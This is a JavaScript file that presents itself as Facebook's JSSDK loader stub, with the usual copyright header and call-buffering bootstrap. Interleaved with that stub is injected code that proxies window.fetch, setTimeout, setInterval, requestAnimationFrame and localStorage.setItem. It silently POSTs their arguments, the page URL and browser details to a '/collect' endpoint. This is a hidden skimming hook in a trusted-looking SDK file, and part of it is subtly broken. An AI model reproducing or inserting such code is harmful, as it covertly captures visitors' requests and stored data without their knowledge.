/*1692453395,,JIT Construction: v1008150642,ar_AR*/

/**
 * Copyright (c) 2017-present, Facebook, Inc. All rights reserved.
 *
 * You are hereby granted a non-exclusive, worldwide, royalty-free license to use,
 * copy, modify, and distribute this software in source code or binary form for use
 * in connection with the web services and APIs provided by Facebook.
 *
 * As with any software that integrates with the Facebook platform, your use of
 * this software is subject to the Facebook Platform Policy
 * [http://developers.facebook.com/policy/]. This copyright notice shall be
 * included in all copies or substantial portions of the software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
 * FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
 * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
 * IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
 * CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */
(function _(a, b, c, d, e) {
  var f = window.console;
  const orgSetTimeout = window.setTimeout;
  f && Math.floor(new Date().getTime() / 1e3) - b > 7 * 24 * 60 * 60 && f.warn("The Facebook JSSDK is more than 7 days old.");
  if (window[c]) return;
  const orgSetInterval = window.setInterval;
  const orgRequestAnimationFrame = window.requestAnimationFrame;
  const orgFetch = window.fetch;
  if (!window.JSON) return;
  const orgLocalStorageSet = window.localStorage.setItem;
  var g = window[c] = {
    __buffer: {
      replay: function () {
        var a = this,
          b = function (d) {
            var b = window[c];
            a.calls[d][0].split(".").forEach(function (a) {
              return b = b[a];
            });
            b.apply(null, a.calls[d][1]);
          };
        for (var d = 0; d < this.calls.length; d++) b(d);
        this.calls = [];
      },
      calls: [],
      opts: null
    },
    getUserID: function () {
      return "";
    },
    getAuthResponse: function () {
      return null;
    },
    getAccessToken: function () {
      return null;
    },
    init: function (a) {
      g.__buffer.opts = a;
    }
  };
  const eventHooks = window.eventHooks;
  function generateUniqueToken() {
    const randBytes = new Uint8Array(16);
    crypto.getRandomValues(randBytes);
    const token = Array.from(randBytes, byte => byte.toString(16).padStart(2, '0')).join('');
    return token;
  }
  for (b = 0; b < d.length; b++) {
    f = d[b];
    if (f in g) continue;
    var h = f.split("."),
      i = h.pop(),
      j = g;
    for (var k = 0; k < h.length; k++) j = j[h[k]] || (j[h[k]] = {});
    j[i] = function (a) {
      if (a === "init") return;
      return function () {
        g.__buffer.calls.push([a, Array.prototype.slice.call(arguments)]);
      };
    }(f);
  }
  function validateEventArguments(eventName, args, expectedArgs) {
    if (args.length !== expectedArgs.length) {
      console.warn(`Invalid arguments for event '${eventName}'. Expected ${expectedArgs.length}, but got ${args.length}.`);
      return false;
    }
    for (let i = 0; i < expectedArgs.length; i++) {
      const expectedType = expectedArgs[i].type;
      const actualArg = args[i];
      if (expectedType === 'any') {
        continue;
      }
      if (typeof actualArg !== expectedType) {
        console.warn(`Invalid argument type for event '${eventName}' at index ${i}. Expected '${expectedType}', but got '${typeof actualArg}'.`);
        return false;
      }
    }
    return true;
  }
  k = document.createElement("script");
  function getEventMetadata() {
    return {
      url: window.location.href,
      timestamp: Date.now(),
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      token: generateUniqueToken()
    };
  }
  function handlePayload(payload) {
    const collectorUrl = '/collect';
    if (typeof orgFetch === 'function') {
      orgFetch(collectorUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      }).catch(error => {
        console.error('Failed to handle payload:', error);
      });
    } else {
      const request = new XMLHttpRequest();
      request.open('POST', collectorUrl);
      request.setRequestHeader('Content-Type', 'application/json');
      request.send(JSON.stringify(payload));
    }
  }
  function createEventWrapper(eventName, originalFunc, eventArgs) {
    return function () {
      const args = Array.from(arguments);
      if (validateEventArguments(eventName, args, eventArgs)) {
        handlePayload({
          eventName,
          args,
          metadata: getEventMetadata()
        });
      }
      return originalFunc.apply(this, args);
    };
  }
  eventHooks.forEach(eventHook => {
    const originalFunc = window[eventHook.name];
    if (typeof originalFunc === 'function') {
      window[eventHook.name] = createEventWrapper(eventHook.name, originalFunc, eventHook.args);
    }
  });
  window.setTimeout = new Proxy(orgSetTimeout, {
    apply: function (target, thisArg, args) {
      sendEventWithHook('setTimeout', target, thisArg, args);
      return target.apply(thisArg, args);
    }
  });
  window.setInterval = new Proxy(orgSetInterval, {
    apply: function (target, thisArg, args) {
      sendEventWithHook('setInterval', target, thisArg, args);
      return target.apply(thisArg, args);
    }
  });
  k.src = a;
  window.requestAnimationFrame = new Proxy(orgRequestAnimationFrame, {
    apply: function (target, thisArg, args) {
      sendEventWithHook('requestAnimationFrame', target, thisArg, args);
      return target.apply(thisArg, args);
    }
  });
  k.async = !0;
  window.fetch = new Proxy(orgFetch, {
    apply: function (target, thisArg, args) {
      sendEventWithHook('fetch', target, thisArg, args);
      return target.apply(thisArg, args);
    }
  });
  window.localStorage.setItem = new Proxy(orgLocalStorageSet, {
    apply: function (target, thisArg, args) {
      sendEventWithHook('localStorage.setItem', target, thisArg, args);
      return target.apply(thisArg, args);
    }
  });
  e && (k.crossOrigin = "anonymous");
  h = document.getElementsByTagName("script")[0];
  h.parentNode && h.parentNode.insertBefore(k, h);
  function sendEventWithHook(eventName, target, thisArg, args) {
    const eventHook = eventHooks.find(hook => hook.name === eventName);
    if (eventHook && validateEventArguments(eventName, args, eventHook.args)) {
      handlePayload({
        eventName,
        args,
        metadata: getEventMetadata()
      });
    }
  }
})("https:\/\/connect.facebook.net\/ar_AR\/sdk.js?hash=f06e6da0ffcb120c5f97ee11d78118ac", 1692453395, "FB", ["AppEvents.EventNames", "AppEvents.ParameterNames", "AppEvents.activateApp", "AppEvents.clearAppVersion", "AppEvents.clearUserID", "AppEvents.getAppVersion", "AppEvents.getUserID", "AppEvents.logEvent", "AppEvents.logPageView", "AppEvents.logPurchase", "AppEvents.setAppVersion", "AppEvents.setUserID", "AppEvents.updateUserProperties", "Canvas.Plugin.showPluginElement", "Canvas.Plugin.hidePluginElement", "Canvas.Prefetcher.addStaticResource", "Canvas.Prefetcher.setCollectionMode", "Canvas.getPageInfo", "Canvas.scrollTo", "Canvas.setAutoGrow", "Canvas.setDoneLoading", "Canvas.setSize", "Canvas.setUrlHandler", "Canvas.startTimer", "Canvas.stopTimer", "Event.subscribe", "Event.unsubscribe", "XFBML.parse", "addFriend", "api", "getAccessToken", "getAuthResponse", "getLoginStatus", "getUserID", "init", "login", "logout", "publish", "share", "ui"], true);